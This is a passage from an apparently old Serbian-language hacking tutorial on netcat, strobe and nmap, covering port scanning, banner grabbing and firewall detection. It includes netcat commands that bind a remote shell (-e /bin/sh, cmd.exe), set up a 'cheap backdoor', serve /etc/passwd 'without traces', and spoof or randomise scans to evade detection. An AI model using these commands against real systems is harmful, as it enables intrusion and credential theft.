  Uz pomoc nc mozemo izvrsiti i efektivno UDP skeniranje.
  
    ==---------[code]----------== 
    bash-2.05b# nc -v -z -u localhost 1-600
    localhost [127.0.0.1] 512 (biff) open
    ==---------[/code]---------== 
 
    
        
     



    ==-[ 0x02c % Services show their faces	   
		
     Veoma je vazno otkriti servis koji osluskuje na datom portu.Kod uNIX-a 
imamo *daemone*
To su kao sto vec rekoh servisi koji rade u pozadini i cekaju na zahtev korisn-
ika. Daemoni slusaju na odedjenim portovima tako da imamo npr ftpd koji predsta-
vlja daemon za FTP protokol itd. DAEMONI su cesto puni rupa i vulnova,koje 
hacker moze iskoristiti za neaut-rizovan ulazak na sistem. Ako se daemon izvrsava
od strane root korisnika sto je u 90% slucajeva mozemo zadobiti root privilegije
nad sistemom. Moze se reci da daemoni predstavljaju kapiju preko koje hackeri 
upadaju u vas sistem. Kako bismo odrzali integritet sistema i sacuvali ga od 
malicioznih napada potreno je voditi racuna o daemonima i svesti ih na minimum 
tj treba koristiti one usluge koje su neophodne kao npr http ili ssh.  

  Takodje dobar nacin da se zasitite jeste da drzite sve service /"up2date/"
tj da ih stalno patchujete i krpite rupe. Ovo ne znaci da uvek uzimate i skidate
najnoviji warez vec mozete koristiti i stari naravno f1x0van.
  Time cete bar ograniciti broj vrata kroz koje provalnik moze da udje.
Da bismo videli koji su nam portovi otvoreni mozemo koristiti i netstat.
Medjutim netstat se koristiti za kontrolu procesa svih mreznih uredjaja.

   ==---------[code]----------==
   root@l0v3x0r:~# netstat -at
   Active Internet connections (servers and established)
   Proto Recv-Q Send-Q Local Address           Foreign Address         State
   tcp        0      0 *:x11                   *:*                     LISTEN
   tcp        0      0 *:http                  *:*                     LISTEN
   tcp        0      0 *:ssh                   *:*                     LISTEN
   ==---------[/code]---------==
   
  Vazno je videti ove redove jer vidimo servise i u kom su stanju.
Vidimo da kod mene  slusaju trenutno tri servisa (stavio kao primer) veza tako-
dje moze biti i ESTABLISHED kao npr.
  
   ==---------[code]----------==
   tcp        0      0 *:x11                   *:*                   LISTEN
   tcp        0      0 *:http                  *:*                   LISTEN
   tcp        0      0 *:ssh                   *:*                   LISTEN
   tcp        0      0 localhost:ssh           localhost:32771       ESTABLISHED
   tcp        0      0 localhost:32771         localhost:ssh         ESTABLISHED
   ==---------[/code]---------==
   
  E sad prelazimo na pravu stvar skeniranje tudjih servisa.
Ovo je veoma mocna metoda jer ce vam dati do znanja koji su servisi pokrenuti
i sto je najvaznije njihove verzije tako da mozete odmah posle scana otici na 
net i traziti *exploit* za datu verziju softwera.
Pomocu alata svanog *strobe* mozemo ovo saznati.
 Malo stariji alat ali skroz upotrebljiv.
 
   ==---------[code]----------==
    root@l0v3x0r:~# /t00lz/strobe/strobe/strobe localhost
   strobe 1.05 (c) 1995-1999 Julian Assange <proff@iq.org>.
   localhost    22 ssh          #Secure Shell Login
               -> SSH-1.99-OpenSSH_3.8.1p1\n
   localhost    80 http         www www-http               #World Wide Web HTTP
   localhost  6000 x11          #6000-6063 are assigned to X Window System
    ==---------[/code]---------==
   
  Ovo je primer mog localhost-a na kom npr mozemo videti verziju SSH klijenta.
Sad naravno suzavamo krug potrage za exploitom samo na tu verziju i pokusamo da 
iskoristimo sve vuln'se date verzije./*fuck daemonz*/ ^H^H^H^H   

Sada cemo malo opisati jos par mogucnosti *strobe* alata:
   
   [=- -v    --opcija -v ce vam kao u vecini UNIX utila dati tzv *brbljivi mod*.
               Znaci videcete sve ono sto radi strobe a sto nebiste videli
	       u normal modu
	   
   [=- -f    --fast mod.probuje samo TCP portove koji su navedeni u portservice 
               fajlu
   
   [=- -l    --probuje hostove sekvecijalno
   
   [=- -i    --imefajla,uzima input iz fajla a ne iz command linije
   
   [=- -t    --vreme posle koje konekcija pokusava da se zavrsi 
   
   [=- -P    --broj porta,binduje port na local masini sa koje se salju probovi
               za portove manje od 1024 treba ti root.
	   
   [=- -A    --interfejs preko koga se salju zahtevi
   
   [=- -e    --broj porta,to je zavrsni port u probu
   
   [=- -b    --poetni port
   
   [=- -o    --salje rezultat u file
   
   [=- -q    --quite mode,ne stampa poruke 
   
 Nadam se da shvatate moc koriscenja strobe-a, koji ce vam mnogo pomoci oko 
identifikovanja mreze i racunara u njoj.

  U svrhe identifikovanja servisa mozemo korsititi i Svajcarca:
 
   ==---------[code]----------==   
   root@l0v3x0r:~# nc -v -n 127.0.0.1 22
   (UNKNOWN) [127.0.0.1] 22 (ssh) open
   SSH-1.99-OpenSSH_3.8.1p1
   ==---------[/code]---------==
   
 Ovako smo dobili verziju SSH koji slusa na portu 22.
 
  Uz pomoc metode skeniranja mozemo utvrditi dali je zastita firewalla prisutna
na hostu.To se moze utvrditi na vise nacina. Firewallovi su korisni izmedju ost-
alog sto mogu zabranjivati i dopustati transfer odredjenih paketa kao i sto mogu
blokirati saobracaj na odredjenim portovima.

  Mozemo npr nasumicno pogoditi tj rucno da je na mrezi FW i to pomocu obicnog 
nmap skeniranja i to ako utvrdimo sledeca pravila:
   1.Nije primljen SYN/ACK paket
   2.Nije primljen RST/ACK paket
   3.Vraca se ICMP poruka "network unreachable" tipa 13 tj Zabrana komunikacije
  
  Prvo cemo izvrsiti skeniranje sa nmapom.
  
   ==---------[code]----------==
   root@l0v3x0r:~# nmap -sS -p1-300 localhost
   ==---------[/code]---------==  
   
  Izvrsicemo ovu komandu i sa *tcpdumpom* analizirati dali se vratio RST/ACK
paket.

   ==---------[code]----------==
   root@l0v3x0r:~# tcpdump
   tcpdump: WARNING: Promiscuous mode not supported on the "any" device
   tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
   listening on any, link-type LINUX_SLL (Linux cooked), capture size 96 bytes
   17:46:22.279420 IP localhost > localhost: icmp 8: echo request seq 3002
   17:46:22.279444 IP localhost > localhost: icmp 8: echo reply seq 3002
   17:46:22.279596 IP localhost.60367 > localhost.http: . ack 615416542 win 3072
   17:46:22.279612 IP localhost.http > localhost.60367: R 615416542:615416542(0) 
   win 0
   17:46:22.580656 IP localhost.60345 > localhost.ssh: S 667248854:667248854(0) 
   win 2048
   17:46:22.580700 IP localhost.ssh > localhost.60345: S 375446774:375446774(0) 
   ack 667248855 win 32767 <mss 16396>
   17:46:22.580713 IP localhost.60345 > localhost.ssh: R 667248855:667248855(0) 
   win 0
   17:46:22.581335 IP localhost.60345 > localhost.vmnet: S 667248854:667248854(0 
   win 2048
   17:46:22.581342 IP localhost.vmnet > localhost.60345: R 0:0(0) ack 667248855 
   win 0
   17:46:22.581596 IP localhost.60345 > localhost.msg-auth: S 667248854:66724885
   4(0) win 2048
   17:46:22.581603 IP localhost.msg-auth > localhost.60345: R 0:0(0) ack 6672488
   55 win 0
   17:46:22.581839 IP localhost.60345 > localhost.234: S 667248854:667248854(0) 
   win 2048
   ==---------[/code]---------==   
   
  Ovo je samo deo outputa tcpdumpa.iZ ovog dela mozemo videti da se vratio ack 
paket sto znaci da barijera kod mene nije bila prisutna.  

Takodje kada sa NC skenirate prikljucak kao sto smo to uradili malopre,ukoliko
dobijete cist output kao malopre sa verzijom servisa i slicnim podatcima znaci
da firewall nije prisutan u supotnom ....

  Vecina servisa sebe odaju po bannerima. To znaci da jednostavnim telnetovanjem
na dati port tj servis mozemo videti Tip i Verziju servisa jel ce nam on sam 
pokazati lice.

   ==---------[code]----------==
   bash-2.05b# telnet www.headcoders.net 22
   Trying 66.98.204.88...
   Connected to www.headcoders.net.
   Escape character is '^]'.
   SSH-1.99-OpenSSH_3.1p1
   ==---------[/code]---------==  
   
  Znaci apsolutno u ovom primeru nismo koristili nikakav pomocni alat, a uspesno
smo dosli do rezultata. Isti postupak mozemo ponoviti i za ostale servise.

 
    
    ==-[ 0x02d % NC blowj0b   
    
    
   Internet macka :))) za miseve ste mozda i culi ali za macke ,wtf?
Ne brinite se ova macka je umiljatija od svake druga macke i tu je samo vama da 
sluzi.Eto moze se reci da ste sebi nasli novog kucnog ljubimca. Ovu macku necete 
vi uciti vec cete uciti od nje.
  Sta je to NetCat???
Najprostije receno NetCat (u daljem tekstu NC), je util koji je  sposoban da zap-
isuje i cita podatke preko TCP i UDP mrezne konekcije. Znaci on moze koristiti 
kako TCP tako i UDP protokole. Prvobitno je namenjen za UNIX sisteme medjutim 
posto je neka moda portovati dobre stvari kao sto ie i NC na winblows sisteme,
tako je izvrseno i portovanje NC. Znaci mozemo ga naci na vise platformi i
dostupan je svima.Nije radjen ni pod kakvom licencom tako da ga
slobodno mozete skidati modifikovati i sl ;)
   NC je alat slobodno se moze reci,mnoooogoo upotrebljiv od strane
kako "hakera" tako i script kidoza. Pre svega on nije preterano lak
za koriscenje i za njegovo savladavanje ce vam trebati nekog vremena.
On je pre svega multifunkcionalan. Ima ogroman broj mogucnosti. Mnogi
misle da je NC samo port skener sto je velika greska, port skener je
u najmanju ruku. Znaci on se moze koristiti u vise razlicitih scenar-
ija, a ne samo za prikupljanje informacija o otvorenim portovima.
 
   NC ima mogucnost da stvara i prihvata TCP (Transmission Control
   Protocol) i UDP (User datagram Protocl) konekcije.
 
  Nadam se da znate osnovne pojmove sto se tice ovih protokola i mreza
uopste,sto ce vam omoguciti lakse razumevanje samih pojmova i nacina 
rada netcata.
Takodje NC moze da sluzi i kao server da slusa na odredjenom portu
za nadolazece konekcije,sve dok se veza ne prekine.
NC vrsi interakciju sa mreznim aplikacijama i servisima.
 
  Cesto mozete videti na raznim forumima i sajtovima da se NC naziva
i Svajcarskim perorezom (Swiss Army knife), zasto je to tako?
Pa bas taj akronim odaje sustinu rada NC - moze da radi sve i svasta.
To je najgrublje receno,cak ce ga pocetnici mozda i odbaciti kao veoma
robustnog neprimamljivog i da nekazem teskog :). Ali kasnije mnogi se
vrate NC, jel cesto ga smatraju preko potrebnim za brze i lakse obavlja-
nje odredjenih poslova.

  Inace NC je command line tool,sto znaci da cete sve operacije izvrsa-
vati preko komande linije tj iz konzole ili terminala. Nema lepog GUI-a
gde cete kliktanjem izvrsiti skeniranje i popisivanje celog sistema.
Ova cinjenica mozda moze i odbiti lenje korisnike naviknute na Winlike
alate.

Jednostavno NC je 'must-have' za svakog security profesionalca i svakog
ko zeli da to postane.

Posto podrzava gotovo sve tipove konekcija NC ima veliki broj ugradjenih
sposobnosti za rad sa njima.Jednostavno koristite ga eksperimentise
radite sta vam je volja je NC je tu da vas sluzi.....

  Prvi korak u radu sa NC je svakako njegovo nalazenje i instaliranje.
Nadam se da je svako dovoljno sposoban da izgoogla NC i da ga pokrene
na svom boxu, ali evo u ovom delu cu da opisem odakle mozete skinuti 
trenutnu verziju NC i konacno pustiti je u rad ;)))))
  Medjutim jake su sanse da ako koristite neki Linux distro ili neki
UNIX-like sistem, da vec imate na svom sistemu po defaultu instaliran nc.
Najlakse cete saznati kucanjem \*nc*\ komande u shellu:

   ==---------[code]----------==
   bash-2.05b# nc           
   Cmd line:    
   ==---------[/code]---------==
   
   
   ..[=-< NC features
   .
   .
   
   Sta je to sto NC izdvaja od drugih alata sta je to zbog cega
  je postao toliko popularan i zbog cega je nasao toliku primeru.
  
U ovom delu cu se truditi da nabrojim glavne prednosti i odlike NC,
kao i neka osnovne upute u koju svrhu se najvise koristi.

  [=- -Dolazece i odlazece konekcije kako na TCP protokolu tako i
       na UDP i to na bilo kom portu koji se definise.
     
  [=- -Moze da cita command line argumente sa STDIN (standard input)
  
  [=- -Mogucnost koriscenja bilo kog lokalnog porta kao izvora 
      (source-a)
     
  [-= -Moze da koristi bilo koju lokalno konfigurisanu mreznu izvornu 
      adresu.
     
  [-= -Mogucnost upotrebe u svrhe port skeniranja.(slabije od nmapa)
  
  [-= -Slow-send mode - slanje svake linije posle odredjenig broje 
       sekundi.
     
  [-= -HEX dump poslatog i primljenog sadrzaja.
  
  [-= -Mogucnost da drugi program uspostavi konekciju sa njim.
  
  [-= -Ugradjena source-routing sposobnost
  
  [-= -Potpuni DNS forward/reverse checking
  
  [-= -Ekstremno brz u svojim zadatcima
  
  
   ..[=-< Command Line
   .
   .
   
    U NC na mnoge nacine mozete doci do zeljenih rezultata. Onaj osnovni
nacin predstavlja interakciju sa interfejsom komandne linije. Pre svega
najbolje bi bilo da naucite na koji princip radi taj interface , z 
zatim i neke od opcija koje mozete koristiti kako bi dobili ono sto ste
trazili.
 
 Komanda linija je tipa:
 
   ==---------[code]----------==
   bash-2.05b#nc <opcije>  hosts  ports      
   ==---------[/code]---------==
	     
  Opcije cu navesti kasnije prvo da objasnim deo /*hosts*/ i /*ports*/.

   [=- -Hosts predstavlja ime domena npr www.yahoo.com ili 32bitnu IP adresu.
        tipa 212.62.46.100.
      
   [=- -Ports predstavlja broj porta ili niza portova koji se skeniraju ili
        se nad njima vrsi neka interakcija. Idnividualni portovi se mogu 
        odvajati sa space (blanko char). Ja ovde necu objasnjavati sta je port
        jel ce to biti podrobno objasnjeno u drugim tekstovima.
      
 Sada cu uz malo objasnjenja navesti i argumente tj opcije koje mozete
 korsitit u radu sa NC, i koje ce vam biti preko potrebne za dalji rad.
 Svaku opciju dobro proucite kao i njen output. Najbolje eksperimentise 
 sa razlicitim argumentima kako bi videli rezultate.
 
   
   [=- -z  - Ova opcija vam donosi zero I/O (inut/output) mod.
             Koristi se pri skeniranju. Ovaj mode salje sao onoliko
	     podataka koliko je potrebno da bi se ustanovilo da li
	     je port otvoren tj da li osluskuje.

   [=- -w <sekundi> - Mozda vam se na prvi pogleed ovaj switch nece uciniti
                      potrebnim niti korisnim, ali svakako i on ima svoju
		      primenu.Sta on radi? Jednostavno navodite broj sekundi
		      koliko ce NC cekati pre nego sto odustane od konekcije
		      Takodje odredjuje koliko ce NC cekati posle primanja EOF
		      signala (End of FIle -kraj file-a), preko standardnog ulaza
		      i zatvaranja konekcija i izlaza.
		      
   [=- -v - Takozvani brbljivi mod. Ovu opciju mozete videtu u gotovo svim UNIX
            utilima.Kao sto joj i samo ime govori -v opcija ce vam omoguciti 
	    mnogo bogatiji i detaljniji output nego sto bi inace dobili.Uz ovu
	    opciju cete videti adresu na koju se NC kaci,upozorenja greske i jos 
	    mnogo toga.Koriscenjem -vv opcije dobijate dupli brbljivi mod znaci
	    jos vise detalja i na kraju konekcija podatak koliko je podataka 
	    poslato i primljeno do zavrsetka konekcije. Znaci uz ove modove cete
	    moci da vidite dosta INFO-a o konekcijama koje NC pravi.
	    
   [=- -u - Sa -u opcijom umesto standardnog TCP protokola koristicete UDP
            protokol.Kao sto znate UDP protokol je protokol gde nemaostvarivanja
	    konekcija ........Znaci ovo se i nemoze bash reci ostvarivanje UDP
	    konekcije. On koristi podrsku kernela za "connected UDP sockets".
	    Kod ovakvog nacina "ostvarivanja veze" podatci se ne salju sve dok
	    se nesto ne procita sa STDIN-a. Samo tada se moze reci dali je UDP
	    server ne drugoj strani.
	    
   [=- -s <adresa> - Ekstremno zanimljiva i korisna opcija koju cete verovatno 
                     dosta puta koristiti jel vam nudi mnogo. Ovladavanje njome i
		     razumevanja kako funkcionise uopste nije tesko.Ona naznaca-
		     va izvornu IP adresu
	             koju NC koristi kada otvara svoje konekcije.Ovo vam 
		     omogucava niz stvari i sve je na vasoj masti :).
		     Npr lako mozete falsifikovati ili lazirati (fakeovati) 
		     svoju pravu IP adresu, nabediti na drugu ip.Naravno tada se 
		     mora koristiti i -g opcija za rutiranje. Takodje bicete 
		     sposobni da stanete ispred servisa
		     koji vec prisuskuje i tako otmete servis, ali o tome kasnije
		     .To se zasniva na prioritetima nad socketima.
		     
   [=- -r - Kada se koristi -r opcija dolazi do randomiziranja lokalnih i remote 
            portova.To znaci da ce NC izmesati lokalne i remote portove tako da
	    ce adminu izgledati menje sumnjivo nego neko bucno skeniranje.Medju-
	    tim malo napredniji admin lako iz logova moze uvideti caku.
	    
   [=- -p <port> - Ovde mozete navesti koji ce lokalni port NC da koristi.
                   Ako ste root mozete birati i portove ispod 1024 tj dobro
		   poznate portove ako niste onda nista :), ispod 1024 nemozete.
		   Ukoliko ovaj argument ne navedete NC ce uzimati port koji 
		   dobije od sistema.
		   
   [=- -o <hexfile> - Ova opcija ce vam omoguciti da zapiste protok i dolazecg
                      i odlazeceg saobracaja u hex formatu u fajl koji navedete.
		      Ukoliko navedete <hexfile onda cete beleziti samo dolazeci
		      saobracaj, a ukoliko navedete >hexfile samo odlazeci.
		      		   	        
   [=- -n - Sa ovom opcijom ne mozete navesti ime domena i hosta vec samo IP 
            adresu. Znaci pri njemom noriscenju se ne vrsi DNS lookup.
	     
   [=- -i <sec> - Pomocu i opcije mozete regulisati u kom vremenskom intervalu
                  NC salje podatke. Na primer ukoliko se vrsi skeniranje portova
		  ovaj broj sekundi ce oznaciti koliko ce NC sacekati pre nego 
		  sto skenira sledeci port u nizu. Jako korisno za izbegavanje 
		  IDS uredjaja.
		  
   [=- -g <lista> - Opcija koju previse i necete korsititi jel vecina danasnjih 
                    rutera i vecina firewallova ce shvatiti vas pokusaj.Naime vi
		    mozete navesti do 8 tacaka rutiranja, kroz koje ce vasi pak-
		    eti prolaziti do konacne destinacije. Znaci to je 8 ip adre-
		    sa kroz koje ce paketi proci.
		    Takodje mozete namestiti da se paketi vrate vasoj izvornoj 
		    adresi.
		    Sve ovo se radi u cilju da se sakrije source adresa.
		    
   [=- -G <hop pointer> - Ona radi u saradnji sa -g opcijom i zajedno se dopunj-
                          avaju.
                          Ova opcija ce vam omoguciti da kontrolisete vasu listu
			  ruta i da kazete koji ce IP ici sledeci. Malo vise ce 
			  ova tema biti objasnjena kasnije.
			  
   [=- -l - Prislusni mod NC. Koristi se zajedno sa -p opcijom i NC u ovom stanju
            ceka nadolazece konekcije.Znaci veze se za bilo koji port koji nav-
	    edete.
	   
  [=- -L - Jaci prislusni mod od -l.medjutim rezervisan samo za windoze.
  
     
    ...To bi ukratko bile neke od opcija NC koje cete najvise koristiti
 ,detaljna objasnjena upotreba svake od njih cete naci u daljem delu teksta.
 Pokusacu da dam dosta primera u kojima cete koristiti navedene opcije :)
 
   ..[=-< Get inside
   .
   .
   
  Prve primere pametnog koriscenja NC cu navesti iz sfere Port Skeniranja.
Posto mislim da vecina koji su culi za NC i misle da je on samo jos jedan
port skener.Iako se grdno varaju na ovaj nacin cu im objasniti da to nije
tako a opet dokazati da je NC odlican Port Skener. Zato se opustite i uzivajte
u voznji.
 
 Vec sam objasnio osnovu rada sa interfejsom NC na pocetku.Znaci ukoliko NC poz-
ovete bez davanja argumenata NC pita za njih i uzima sa STDIN-a,a zatim ih int-
erno prelama u argumente. 

 Pocecemo od najprostijeg skeniranja portova:
 
   ==---------[code]----------==
   root@digital-phear:~# nc -v -z 127.0.0.1 1-10000     
   localhost [127.0.0.1] 6000 (x11) open                
   ==---------[/code]---------== 
		   
 Iz ovog primera mozete videti najprimitivniji nacin skeniranja ,a da se
 tice NC. Jos samo ovaj put cu navesti sta koji argument ovde znaci.
 
 #nc   - pokretanje netcat-a
 -v    - verbose iliti brbljivi mod
 -z    - salje onoliko podataka koliko je potrebno da se
         ustanovi dali je port otvoren.Vrlo brzo obavlja scan.
127.0.0.1 - je IP adresa mete koju skeniramo tj hosta.Ovde 
            sam naveo svoj localhost.
1-1000 - je raspon portova koji ce se skenirati.Znaci nC ce skenirati
         sve portove od 1 do 10000.
	 
Na outputu se jasno vidi da mi je otvoren samo port 6000,tj X server.
Znaci output je izdeljen na sledeca polja.

|host|broj porta|stanje

Broj portova i servisi koji se na njima nalaze mozete pogledati u /etc/services.

   ==---------[code]----------==
   root@digital-phear:~# nc -vv -z 127.0.0.1 1-20           
   localhost [127.0.0.1] 20 (ftp-data) : Connection refused 
   localhost [127.0.0.1] 19 (chargen) : Connection refused  
   localhost [127.0.0.1] 18 (msp) : Connection refused      
   localhost [127.0.0.1] 17 (qotd) : Connection refused     
   localhost [127.0.0.1] 16 (?) : Connection refused        
   localhost [127.0.0.1] 15 (?) : Connection refused        
   localhost [127.0.0.1] 14 (?) : Connection refused        
   localhost [127.0.0.1] 13 (daytime) : Connection refused  
   localhost [127.0.0.1] 12 (?) : Connection refused        
   localhost [127.0.0.1] 11 (systat) : Connection refused   
   localhost [127.0.0.1] 10 (?) : Connection refused        
   localhost [127.0.0.1] 9 (discard) : Connection refused   
   localhost [127.0.0.1] 8 (?) : Connection refused         
   localhost [127.0.0.1] 7 (echo) : Connection refused      
   localhost [127.0.0.1] 6 (?) : Connection refused         
   localhost [127.0.0.1] 5 (rje) : Connection refused       
   localhost [127.0.0.1] 4 (?) : Connection refused         
   localhost [127.0.0.1] 3 (compressnet) : Connection refused
   localhost [127.0.0.1] 2 (compressnet) : Connection refused
   localhost [127.0.0.1] 1 (tcpmux) : Connection refused     
   sent 0, rcvd 0                                           
   ==---------[/code]---------==
	 
U ovom primeru smo koristili -vv argument i dobili smo detaljniji OUTPUT.
NC nam je sada prikazao pokusam ostvarivanja konekcije na svaki port zasebno.
Na kraju outputa takodje je ispisao sumu poslatih i primljenih podataka.

   ==---------[code]----------==
   root@digital-phear:~# nc -vv -z -n 207.44.194.79 20-30     
   ==---------[/code]---------==
		   
Ovde iskoriscavamo -n opciju tako da cemo NC proslediti IP adresu
umesto imena hosta.Ukoliko zelite da vidite IP adresu koja pripada
hostu mozete izvrsiti nslookup ili preo /*host*/ komande videti IP.

   ==---------[code]----------==
   root@digital-phear:~# nc -v -z -r -i 10 localhost 20-30 |
   ==---------[/code]---------==
		   
 -r opcija ce nam omoguciti da NC randomizira portove tj da ih
ne skenira po redu vec da preskace, sto ne odaje utisak skriptong
skeniranja, a sa -i 10 opcijom smo naredili da NC salje pakete svakih
10 sekundi tj da svakih 10 sekundi proba port. Medjutim ovako se 
skeniranje moze zaista oduziti posebno ako stavite veci interval i 
veliki broj portova.

Sada cu prikazati jedno UDP skeniranje. Medjutim NC nije
100% pouzdan sto se tice UDP skeniranje zbog toga sto
svoj zakljucivanje o otvorenosti porta zasniva na 
dobijanju ICMP greske tako da npr ako je firewallom
ICMP saobracaj zabranjen mozete dobiti pogresnu sliku.

   ==---------[code]----------==
   root@digital-phear:~# nc -v -z -u  localhost 1-1000      
   localhost [127.0.0.1] 512 (biff) open                    
   ==---------[/code]---------==

 Posto kod mene nije zabranjen ICMP sobracaj NC je uspesno
dao report da mi je otvoren 512 UDP port.
 
 Sada cemo podesiti NC tako da cemo izvrsiti skeniranje najkoriscenijih
 portova kako bismo dobili uvid u sigurnost sistema.

   ==---------[code]----------==                      
   bash-2.05b# echo QUIT | nc -v -w 6 localhost 20-250 500-600 5000-7000|
   localhost [127.0.0.1] 6000 (x11) open   
   ==---------[/code]---------==
   
  Ovde smo koristili QUIT i timeout na 6 sec kako bi mozda dobili neku
poruku o gresci ili greeting od pojedinih servisa.Odatkle bi lako mogli
saznati i verziju servisa.

   
   ..[=-< Services hijacked
   .
   .   
   
   
    Identifikovanje servisa i otimanje usluga je veoma vazan posao
   kod napada na sistem. Zbog toga mu treba dati veliku paznju i
   pozornost. Sto vise detalja o servisima to bolje za vas.
   Lakse cete naci vulnove ukoliko znate tacne verzije servisa
   koji slusaju na odredjenom portu.
 
Dobijanje takvih informacija se moze postici konektovanjem na port
gde ce servis izbaciti svoju verziju, OS mozda itd.

Kako iskoristiti NC za otkrivanje servisa.lako:

    ==---------[code]----------==
root@digital-phear:~# nc -v www.headcoders.net 80
get / http
DNS fwd/rev mismatch: www.headcoders.net != ev1s-66-98-204-88.ev1servers.net
www.headcoders.net [66.98.204.88] 80 (http) open
HTTP/1.1 400 Bad Request
Date: Sat, 05 Feb 2005 23:06:30 GMT
Server: Apache/1.3.27 (Unix)  (Red-Hat/Linux) mod_jk/1.2.0 mod_perl/1.26 
PHP/4.2.2 FrontPage/5.0.2 mod_ssl/2.8.12 OpenSSL/0.9.6b
Connection: close
Content-Type: text/html; charset=iso-8859-1
X-Pad: avoid browser bug

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<HTML><HEAD>
<TITLE>400 Bad Request</TITLE>
</HEAD><BODY>
<H1>Bad Request</H1>
Your browser sent a request that this server could not understand.<P>
The request line contained invalid characters following the protocol string.<P>
<P>
<HR>
<ADDRESS>Apache/1.3.27 Server at srv1.e-sinergija.com Port 80</ADDRESS>
</BODY></HTML>
   ==---------[/code]---------==
		      
		      
 Znaci kada naredimo NC da se poveze na port 80 koji je default WebSeerver port,
 izvrisicemo kucanje komandi
 GET / HTTP
 Ovim cemo dobiti verziju WebServera kao i osnovno zaglavlje indexa.
 Saznanje verzije WebServera je zaista korisna informacija koju cemo
 obraditi kasnije.
  

Na brz nacin mozemo saznati verziju i tip servisa koji osluskuju na datom
portu uz pomoc -v -n opcija.

   ==---------[code]----------==
   root@l0v3x0r:~# nc -v -n 127.0.0.1 22    
   (UNKNOWN) [127.0.0.1] 22 (ssh) open       
   SSH-1.99-OpenSSH_3.8.1p1                  
   ==---------[/code]---------==

Ajmo sada malo elitnije da iscupamo header.

   ==---------[code]----------==
 root@l0v3x0r:~#printf 'GET / HTTP/1.0\n\n'  | netcat -w 10 www.mycity.co.yu 80|     |
   ==---------[/code]---------==
  
 Isto tako mozete izvrsiti konektovanje na UDP port,naravno potrebno je dodati
 -u opciju.
 



   ==---------[code]----------== 
   bash-2.05b# nc -v  -u  localhost 512                     
   localhost [127.0.0.1] 512 (biff) open                    
   ...                                                   
   ==---------[/code]---------==
  Kako oteti servis?
U ovom primeru cu navesti kako se NC moze iskoristiti za otimanje servisa


Prvo na sistemu na koji se ulogujete pokrenite netstat
                       
   ==---------[code]----------== 
   bash-2.05b# netstat -a -n
   Active Internet connections (servers and established)
   Proto Recv-Q Send-Q Local Address       Foreign Address         State
   tcp        0      0 0.0.0.0:6000        0.0.0.0:*               LISTEN
   tcp        0      0 10.2.5.112:32772    207.44.202.121:6667     ESTABLISHED
   udp        0      0 0.0.0.0:512         0.0.0.0:*
   ==---------[/code]---------==

Ovim cemo videti trenutno aktivne Internen konekcije.
Znaci kod mene je trenutno otvoren port 6000 tj X server koji je u stanju
osluskivanja.Foreign Adress je 0.0.0:* sto znaci da je locaklna.
Ispod vidimo da sam konektovan na irc server port 6667 znaci ESTABLISHED
veza je uspostavljena medjutim to nas trenutno ne interesuje.


bash-2.05b# nc -l -v  -s 192.168.0.1 -p 6000 localhost |

		 
Sada ce netstat izgledati ovako;


   ==---------[code]----------== 
   bash-2.05b# netstat -a -n
   Active Internet connections (servers and established)
   Proto Recv-Q Send-Q Local Address           Foreign Address      State 
   tcp        0      0 192.168.0.1:6000        0.0.0.0:*            LISTEN
   tcp        0      0 10.2.5.112:32772        207.44.202.121:6667  ESTABLISHED
   udp        0      0 0.0.0.0:512             0.0.0.0:*
   ==---------[/code]---------==

Sada iz ovog skracenog outputa mozemo videti da slusamo pre X servera.


   ..[=-< bl0wjobs
   .
   . 
   
   
Kao sto sam vec ranije pomenuo -l opcija ce narediti NC da radi u 
prislusnom modu tj da slusa za konekcijama.


   ==---------[code]----------==
    bash-2.05b#nc -v -l localhost -p 1337                    
   ==---------[/code]---------==
   
   
Time ce NC slusati na portu 1337 za nadolazece konekcije.
Na drugom racunaru dovoljno je da ukucamo:

   ==---------[code]----------==
   bash-2.05b#nc -v localhost 1337                          
   ==---------[/code]---------==

Sada mozemi tipakati slobodno ;p


Kako poslati neki file na remote sistem bez koriscenja scp npr.
Uz NC mozete i to postici a sto je najbolje necete ostaviti nikakve
tragove.

Na remote sistemu pokrenemo NC sa sledecim parametrima.

   ==---------[code]----------==
   bash-2.05b# nc l p 1234 >file         
   ==---------[/code]---------==


Zatim cemo na local sistemu poreknuti:

   ==---------[code]----------==
   bash-2.05b#nc <destinacija>  1234 <origfile 
   ==---------[/code]---------==

Ili zamislite da izvrsimo kopiranje preko UDP protokola.
Tako sto cemo staviti ulazne i izlazne fajlove na svaki kraj
kanala podataka.

   ==---------[code]----------==
   'nc -l -u -p 3333 < fajl                    
   ==---------[/code]---------==

   ==---------[code]----------==
   #nc -u meta 3333 > kopija_fajla            
   ==---------[/code]---------==
   
Zamislimo scenario u kome mozemo da svucemo /etc/passwd
fajl i to bez ikakvih naznaka da smo uradili tj bez
ikakvih tragova:

   ==---------[code]----------==
   #nc -l -u -p 3333 < /etc/passwd            
   ==---------[/code]---------==




Sa NC mozemo narediti izvrsenje neke komande kada se NC
nalazi u prislusnom rezimu. Znaci ta komanda ce se izvrsiti
odmah po uspostavljenju konekcije.

   ==---------[code]----------==
   nc -v -l localhost -p 22 -e cmd.exe        
   ==---------[/code]---------==
   
ili za unix sisteme:

   ==---------[code]----------==
   nc -v -l localhost -p 22 -e /bin/sh        
   ==---------[/code]---------==



NC nam moze izigravati i jeftin backdoor,naravno opet
iz prislusnog rezima.

   ==---------[code]----------==
   bash-2.05b# nc -l -v -p 888   
   listening on [any] 888 ...    
   ==---------[/code]---------==

A zatim cemo preko drugog nc izvrsiti uspostavljanje veze.
         
   ==---------[code]----------==
   bash-2.05b# nc -v 127.0.0.1 888 -e /bin/sh    
   localhost [127.0.0.1] 888 (accessbuilder) open
   ==---------[/code]---------==

Jasno je da smo ovim postupkom dobili shell.Sada mozemo izvrsavati
standardne UNIX komande kao da smo za svojom konzolom.

  A sada niste znali da sa NC mozete i njuskati :)
Daaaaaa NC vam moze posluziti kao primitivno sniffer.
Posto je BaCkSpAcE dosta govorio o sniferima ja ovde necu
opisivati njihovu upotrebu vec cu samo pokazati kako se NC
jednostavno moze iskoristiti u te namene.

   ==---------[code]----------==
   bash-2.05b# nc -o /tmp/govno.`date +%s.$$` irc.krstarica.com 6667 
  :hub.krstarica.com NOTICE AUTH :*** Looking up your hostname...
  :hub.krstarica.com NOTICE AUTH :*** Found your hostname (cached)
  :hub.krstarica.com NOTICE AUTH :*** Checking ident...
  :hub.krstarica.com NOTICE AUTH :*** No ident response; username prefixed with 
